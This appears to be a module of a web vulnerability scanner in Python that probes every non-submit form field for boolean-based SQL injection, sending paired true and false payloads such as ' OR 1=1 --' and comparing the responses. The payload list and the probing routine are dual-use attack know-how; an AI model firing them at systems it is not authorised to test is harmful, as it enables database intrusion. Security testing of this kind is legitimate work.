import requests
from colorama import Fore, Style
from urllib.parse import urljoin
from utils import write_to_file


def test_response(data, form_data, url, method, payload, false_payload, input_tag):
    """
    This function is used to test the response of the server.
    """
    if input_tag["name"]:
        data[input_tag["name"]] = f"1{payload}"
    action_url = (
        urljoin(url, form_data["action"])
        if form_data["action"] and form_data["action"] != "#"
        else url
    )
    if form_data["method"] == "post":
        response = requests.post(action_url, data=data)
    elif form_data["method"] == "get":
        response = requests.get(action_url, params=data)
    else:
        return
    if input_tag["name"]:
        data[input_tag["name"]] = f"1{false_payload}"
    action_url = (
        urljoin(url, form_data["action"])
        if form_data["action"] and form_data["action"] != "#"
        else url
    )
    if form_data["method"] == "post":
        false_response = requests.post(action_url, data=data)
    elif form_data["method"] == "get":
        false_response = requests.get(action_url, params=data)
    else:
        return
    return response.text != false_response.text


def boolean_based(form_data, url, method, output_file):
    """
    This function is used to perform boolean based SQL injection.
    """
    true_payloads = [
        " OR LENGTH(DATABASE())>0 --",
        " OR EXISTS(SELECT 1 FROM information_schema.tables) --",
        " OR EXISTS(SELECT 1 FROM information_schema.tables) AND 1=1 --",
        " OR 1=1 --",
    ]
    false_payloads = [
        " OR LENGTH(DATABASE())<0 --",
        " OR NOT EXISTS(SELECT 1 FROM information_schema.tables) --",
        " OR EXISTS(SELECT 1 FROM information_schema.tables) AND 1=0 --",
        " OR 1=0 --",
    ]
    print(f"{Fore.LIGHTYELLOW_EX}[*] Performing boolean based SQL injection...{Style.RESET_ALL}")
    for payload, false_payload in zip(true_payloads, false_payloads):
        for input_tag in form_data["inputs"]:
            if input_tag["type"] == "submit":
                continue
            data = {}
            for tag in form_data["inputs"]:
                if tag["type"] == "hidden" or tag["value"]:
                    data[tag["name"]] = tag["value"]
                elif tag["type"] != "submit":
                    data[tag["name"]] = "test"
            if test_response(data, form_data, url, method, payload, false_payload, input_tag):
                print(f"{Fore.LIGHTGREEN_EX}[+] The parameter {input_tag['name']} is vulnerable to boolean based SQL injection.{Style.RESET_ALL}")
                write_to_file(
                    output_file,
                    f"[+] {url} - Boolean-based SQLi vulnerability found"
                )
            else:
                print(f"{Fore.LIGHTRED_EX}[-] The parameter {input_tag['name']} is not vulnerable to boolean based SQL injection.{Style.RESET_ALL}")
